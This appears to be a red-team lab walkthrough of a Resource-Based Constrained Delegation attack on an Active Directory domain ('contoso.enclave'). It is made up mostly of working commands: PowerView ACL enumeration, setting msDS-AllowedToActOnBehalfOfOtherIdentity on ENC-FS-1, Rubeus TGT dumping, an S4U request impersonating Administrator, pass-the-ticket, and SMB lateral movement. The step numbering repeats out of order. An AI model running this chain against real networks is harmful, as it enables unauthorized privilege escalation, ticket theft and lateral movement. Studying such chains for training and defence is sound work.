#### Enumeration

```powershell
powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteProperty|WriteDacl" }

# AceQualifier           : AccessAllowed
# ObjectDN               : CN=ENC-FS-1,OU=FS,OU=Servers,DC=contoso,DC=enclave
# ActiveDirectoryRights  : ReadProperty, WriteProperty
# ObjectAceType          : ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity
# ObjectSID              : S-1-5-21-1330904164-3792538338-293942156-1601
# InheritanceFlags       : ContainerInherit
# BinaryLength           : 72
# AceType                : AccessAllowedObject
# ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
# IsCallback             : False
# PropagationFlags       : None
# SecurityIdentifier     : S-1-5-21-1330904164-3792538338-293942156-2103
# AccessMask             : 48
# AuditFlags             : None
# IsInherited            : True
# AceFlags               : ContainerInherit, Inherited
# InheritedObjectAceType : Computer
```

The output shows that the SID corresponding to `Enclave Access` has `WriteProperty` over the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the `ENC-FS-1` object. In practical terms, this is equivalent to the ability to configure Resource-Based Constrained Delegation on that host.

Resolve the SID that appears in the ACLs and confirm that it corresponds to the Enclave Access group

```powershell
ldapsearch "(objectSid=S-1-5-21-1330904164-3792538338-293942156-2103)" --attributes sAMAccountName,distinguishedName
# distinguishedName: CN=Enclave Access,CN=Users,DC=contoso,DC=enclave
```

We can abuse RBCD because the `Enclave Access` group, from which we already inherit effective privileges, controls the attribute required to allow delegation toward `ENC-FS-1`.

#### ATAQUE

1. Configure the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on `ENC-FS-1` to authorize the `ENC-JMP-1$` machine account and enable RBCD

```powershell
powerpick $sid=(Get-DomainComputer ENC-JMP-1).ObjectSID; $sd=New-Object System.Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"; $b=New-Object byte[] ($sd.BinaryLength); $sd.GetBinaryForm($b,0); Set-DomainObject -Identity ENC-FS-1 -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$b}
```

2. Verify

```powershell
powerpick Get-DomainComputer -Identity ENC-FS-1 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
# {1, 0, 4, 128...}                       

ldapsearch "(&(objectClass=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" --attributes sAMAccountName
# sAMAccountName: ENC-FS-1$
```

> If you see any binary blob (`{1,0,4,128...}`) → RBCD exists

3. Extract the current machine account TGT from the SYSTEM context to use it in the S4U flow  

```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap  
```

2. Request a service ticket toward `cifs/enc-fs-1` while impersonating Administrator using the `ENC-JMP-1$` account authorized through RBCD  

```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:ENC-JMP-1$ /impersonateuser:Administrator /msdsspn:cifs/enc-fs-1 /nowrap /ticket:  
```

`/user:ENC-JMP-1$` represents the machine account that was just authorized through RBCD.

3. PtT and validation

```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:  
  
# Validation
ls \\enc-fs-1\c$  
```

4. Lateral movement

```powershell
jump scshell64 enc-fs-1 smb
```

#### Result

- `ENC-JMP-1$` is authorized to delegate toward `ENC-FS-1`
- a service ticket impersonating `Administrator` is requested
- the ticket is injected and access to `ENC-FS-1` is validated
- the final lateral movement over SMB is materialized
